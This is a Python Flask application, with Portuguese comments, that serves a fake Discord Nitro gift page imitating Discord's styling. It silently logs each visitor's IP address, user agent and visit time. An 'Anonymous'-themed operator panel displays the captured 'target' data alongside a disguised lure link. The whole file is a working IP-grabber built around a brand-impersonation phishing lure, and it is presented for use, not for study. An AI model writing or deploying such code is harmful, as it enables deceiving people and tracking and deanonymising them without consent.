import os
import json
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)

LOGS_FILE = "latest_log.json"

def carregar_ultimo_log():
    if os.path.exists(LOGS_FILE):
        try:
            with open(LOGS_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            return None
    return None

def salvar_ultimo_log(dados):
    with open(LOGS_FILE, "w", encoding="utf-8") as f:
        json.dump(dados, f, ensure_ascii=False, indent=2)

# Template HTML da página falsa do Discord
DISCORD_NITRO_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Your Gift Is Here</title>
    <style>
        body {
            background-color: #313338;
            color: #dbdee1;
            font-family: 'Whitney', 'Helvetica Neue', Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            overflow: hidden;
        }
        .container {
            background-color: #2b2d31;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            box-shadow: 0 8px 24px rgba(0,0,0,0.3);
            max-width: 420px;
            width: 100%;
        }
        .nitro-img {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
        }
        h2 {
            color: #f2f3f5;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
            color: #949ba4;
            line-height: 20px;
            margin-bottom: 24px;
        }
        .btn {
            background-color: #5865f2;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 3px;
            cursor: pointer;
            width: 100%;
            text-decoration: none;
            display: inline-block;
            box-sizing: border-box;
        }
        .btn:hover {
            background-color: #4752c4;
        }
    </style>
</head>
<body>
    <div class="container">
        <svg class="nitro-img" viewBox="0 0 127.14 96.36" fill="#5865f2">
            <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.79,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.81,11.1,105.25,105.25,0,0,0,32.25-16.15c2.63-27.23-4.53-51.37-20.45-72.15ZM42.45,65.69C36.18,65.69,31,60,31,53s5.18-12.72,11.45-12.72S53.9,46,53.9,53,48.71,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.2,60,73.2,53s5.18-12.72,11.45-12.72S96.14,46,96.14,53,90.95,65.69,84.69,65.69Z"/>
        </svg>
        <h2>Gift Link Has Expired</h2>
        <p>This gift link has either been already claimed or has expired.</p>
        <a href="https://discord.com/login" class="btn">Login to Discord</a>
    </div>
</body>
</html>
"""

# Template HTML do Painel com a Máscara do Anonymous de Fundo
PANEL_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ANONYMOUS_INTERCEPT // SECURE TERMINAL</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; }
        body {
            background-color: #030712;
            color: #38bdf8;
            font-family: 'Share Tech Mono', monospace;
            margin: 0;
            padding: 20px;
            overflow-x: hidden;
            height: 100vh;
        }

        /* Fundo com a Máscara do Anonymous estilizada e marca d'água centralizada */
        .bg-anonymous {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(3, 7, 18, 0.85), rgba(3, 7, 18, 0.92)), 
                        url('https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?q=80&w=1920&auto=format&fit=crop') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }

        /* Efeito de Scanlines e Blur */
        body::before {
            content: " ";
            display: block;
            position: fixed;
            top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(56, 189, 248, 0.02), rgba(0, 0, 0, 0), rgba(56, 189, 248, 0.02));
            z-index: 99999;
            background-size: 100% 4px, 6px 100%;
            pointer-events: none;
        }

        .container { 
            max-width: 900px; 
            margin: 0 auto; 
            background: rgba(15, 23, 42, 0.82);
            backdrop-filter: blur(12px);
            border: 1px solid rgba(56, 189, 248, 0.3);
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 0 30px rgba(56, 189, 248, 0.15);
        }

        header {
            border-bottom: 1px solid rgba(56, 189, 248, 0.3);
            padding-bottom: 15px;
            margin-bottom: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        h1 { margin: 0; font-size: 22px; color: #f8fafc; text-shadow: 0 0 10px rgba(56,189,248,0.5); letter-spacing: 2px; }

        /* Torre de Sinal Piscando */
        .signal-tower {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #38bdf8;
            font-weight: bold;
            background: rgba(56, 189, 248, 0.1);
            padding: 6px 12px;
            border: 1px solid rgba(56, 189, 248, 0.4);
            border-radius: 4px;
        }
        .tower-light {
            width: 10px;
            height: 10px;
            background-color: #38bdf8;
            border-radius: 50%;
            box-shadow: 0 0 10px #38bdf8;
            animation: pulse-tower 1s infinite alternate;
        }
        @keyframes pulse-tower {
            0% { opacity: 0.3; transform: scale(0.8); }
            100% { opacity: 1; transform: scale(1.2); box-shadow: 0 0 15px #38bdf8; }
        }

        .card {
            background: rgba(3, 7, 18, 0.7);
            border: 1px solid rgba(56, 189, 248, 0.2);
            padding: 20px;
            border-radius: 4px;
            margin-bottom: 20px;
        }
        h3 { margin-top: 0; color: #f8fafc; font-size: 15px; letter-spacing: 1px; border-left: 3px solid #38bdf8; padding-left: 10px; }
        
        .link-box {
            background: #020617;
            border: 1px dashed rgba(56, 189, 248, 0.4);
            padding: 12px;
            font-size: 15px;
            color: #38bdf8;
            word-break: break-all;
            letter-spacing: 1px;
        }

        .target-box {
            background: #020617;
            border: 1px solid rgba(56, 189, 248, 0.4);
            padding: 20px;
            position: relative;
            box-shadow: inset 0 0 15px rgba(56,189,248,0.05);
        }
        .target-item { margin-bottom: 12px; font-size: 15px; color: #cbd5e1; }
        .ip-highlight { color: #f43f5e; font-weight: bold; text-shadow: 0 0 8px rgba(244,63,94,0.6); font-size: 22px; }
        
        .footer { text-align: center; font-size: 11px; color: #64748b; margin-top: 30px; letter-spacing: 2px; }
    </style>
</head>
<body>
    <div class="bg-anonymous"></div>
    <div class="container">
        <header>
            <h1>[ANON_SYS] // SECURE_TERMINAL</h1>
            <div class="signal-tower">
                <div class="tower-light"></div>
                EXPECT US
            </div>
        </header>

        <div class="card">
            <h3>TARGET_DISPATCH_URL</h3>
            <div class="link-box" id="track-link">INITIALIZING...</div>
        </div>
        
        <div class="card">
            <h3>INTERCEPTED_TARGET_DATA</h3>
            <div class="target-box">
                {% if log %}
                    <div class="target-item"><strong>TIMESTAMP:</strong> {{ log.data }}</div>
                    <div class="target-item"><strong>TARGET_IP:</strong> <span class="ip-highlight">{{ log.ip }}</span></div>
                    <div class="target-item"><strong>DEVICE_AGENT:</strong> {{ log.user_agent }}</div>
                {% else %}
                    <div style="color: #64748b; text-align: center; padding: 15px;">[ AGUARDANDO SINAL DO ALVO... ]</div>
                {% endif %}
            </div>
        </div>

        <div class="footer">
            WE ARE LEGION // PROTOCOL: STEALTH_ON
        </div>
    </div>

    <script>
        document.getElementById('track-link').innerText = 'https://sl1nk.com/discord-nitro-gift-7x9kl5t';
        
        setTimeout(function(){
            window.location.reload();
        }, 3000);
    </script>
</body>
</html>
"""

@app.route('/nitro/<path:subpath>')
def nitro_fake(subpath):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Desconhecido')
    data_hora = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    salvar_ultimo_log({
        "ip": ip,
        "user_agent": user_agent,
        "data": data_hora
    })

    return render_template_string(DISCORD_NITRO_HTML)

@app.route('/painel')
def painel():
    log = carregar_ultimo_log()
    return render_template_string(PANEL_HTML, log=log)

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
